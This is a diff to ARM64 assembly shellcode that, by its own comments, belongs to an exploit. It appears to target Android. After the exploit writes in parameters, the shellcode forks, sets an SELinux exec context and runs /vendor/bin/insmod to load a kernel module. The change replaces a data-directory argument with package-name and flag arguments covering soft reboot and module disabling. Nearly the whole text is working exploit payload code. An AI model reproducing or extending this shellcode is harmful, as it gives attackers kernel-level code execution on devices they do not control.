@@ -28,16 +28,26 @@ ko_target:
 libcxx_ko_target_off:
     .int ko_target - libcxx_data
 
-/* "data_dir=" and its value read as one string: the exploit writes the app's
- * data dir at libcxx_data_dir_val_off before the shellcode runs. */
-data_dir_param:
-    .ascii "data_dir="
-data_dir_val:
-    .skip 128, 0
+/* "package_name=" and its value read as one string: the exploit writes the
+ * manager package at libcxx_pkg_val_off before the shellcode runs. */
+pkg_param:
+    .ascii "package_name="
+pkg_val:
+    .skip 48, 0
+
+/* "flags=" and its value read as one string: bit0 soft reboot, bit1 disable
+ * modules, written at libcxx_flags_val_off. */
+flags_param:
+    .ascii "flags="
+flags_val:
+    .skip 8, 0
     .balign 4
-    .global libcxx_data_dir_val_off
-libcxx_data_dir_val_off:
-    .int data_dir_val - libcxx_data
+    .global libcxx_pkg_val_off
+libcxx_pkg_val_off:
+    .int pkg_val - libcxx_data
+    .global libcxx_flags_val_off
+libcxx_flags_val_off:
+    .int flags_val - libcxx_data
 
     .align 4
 
@@ -98,7 +108,7 @@ libcxx_start:
     cbnz    w0, return          // parent returns to init
 
     // ── worker child ──────────────────────────────────────────────────────
-    sub     sp, sp, 32
+    sub     sp, sp, 48
 
     // Fork grandchild: set SELinux exec context → execve insmod
     mov     x0, #SIGCHLD
@@ -122,14 +132,17 @@ libcxx_start:
     mov     x8, #SYS_write
     svc     0
 
-    // execve("/vendor/bin/insmod", [exe_path, ko_target, data_dir_param, NULL], NULL)
+    // execve("/vendor/bin/insmod",
+    //        [exe_path, ko_target, pkg_param, flags_param, NULL], NULL)
     adr     x1, exe_path
     str     x1, [sp]
     adr     x1, ko_target
     str     x1, [sp, 8]
-    adr     x1, data_dir_param
+    adr     x1, pkg_param
     str     x1, [sp, 16]
-    str     xzr, [sp, 24]
+    adr     x1, flags_param
+    str     x1, [sp, 24]
+    str     xzr, [sp, 32]
     adr     x0, exe_path
     mov     x1, sp
     mov     x2, xzr
